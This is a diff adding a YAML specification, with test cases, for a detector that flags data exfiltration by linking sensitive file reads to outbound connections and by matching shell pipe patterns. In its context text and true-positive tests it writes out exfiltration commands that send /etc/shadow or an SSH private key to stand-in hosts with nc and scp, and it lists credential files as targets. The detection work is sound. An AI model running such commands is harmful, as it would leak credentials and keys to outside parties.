@@ -1,0 +1,77 @@
+kind: detector
+name: data_exfiltration
+version: 1
+description: "Detects data exfiltration via correlation of sensitive file reads with outbound connections, and command pipe patterns"
+
+context: |
+  Two detection modes:
+  1. Correlation: tracks when sensitive files are read, then checks if the
+     same process makes an outbound network connection within a time window.
+  2. Command pattern: detects commands that pipe sensitive files directly
+     to network tools (e.g., cat /etc/shadow | nc evil.com 4444).
+
+  Sensitive files:
+  - Credential files: /etc/shadow, /etc/passwd, /etc/master.passwd
+  - SSH keys: .ssh/id_rsa, .ssh/id_ed25519, .ssh/authorized_keys
+  - Cloud credentials: .aws/credentials, .aws/config
+  - Secrets: .env, .pem, .key, .p12, .pfx
+  - Database dumps: .sql, .dump, .bak
+
+  Command pattern pairs checked: cat+nc, cat+curl, tar+curl, tar+nc,
+  scp+shadow, scp+passwd, scp+.ssh, scp+.aws, scp+.env, scp+.pem, etc.
+
+behavior:
+  does:
+    - "Correlates sensitive file reads with outbound connections by process"
+    - "Detects command pipes (cat /etc/shadow | nc)"
+    - "Covers credential files, SSH keys, cloud secrets, database dumps"
+    - "16 command pattern pairs checked"
+  does_not:
+    - "Alert on reads of non-sensitive files"
+    - "Alert on reads without subsequent network connection"
+    - "Re-alert within cooldown"
+
+config:
+  cooldown_secs: configurable
+  correlation_window_secs: configurable
+
+dependencies: []
+
+test_cases:
+  true_positives:
+    - description: "cat /etc/shadow piped to nc"
+      input:
+        kind: "shell.command_exec"
+        command: "cat /etc/shadow | nc 1.2.3.4 4444"
+      expected:
+        alert: true
+        severity: "critical"
+
+    - description: "scp of SSH key to external host"
+      input:
+        kind: "shell.command_exec"
+        command: "scp ~/.ssh/id_rsa attacker@evil.com:/tmp/"
+      expected:
+        alert: true
+        severity: "high"
+
+  true_negatives:
+    - description: "Reading /etc/shadow without network connection"
+      input:
+        kind: "file.read_access"
+        filename: "/etc/shadow"
+        no_subsequent_network: true
+      expected:
+        alert: false
+        reason: "No outbound connection within correlation window"
+
+    - description: "cat of non-sensitive file piped to nc"
+      input:
+        kind: "shell.command_exec"
+        command: "cat /tmp/test.txt | nc 1.2.3.4 4444"
+      expected:
+        alert: false
+        reason: "/tmp/test.txt is not a sensitive file"
+
+history:
+  - "2026-04-02: initial spec from source code analysis"
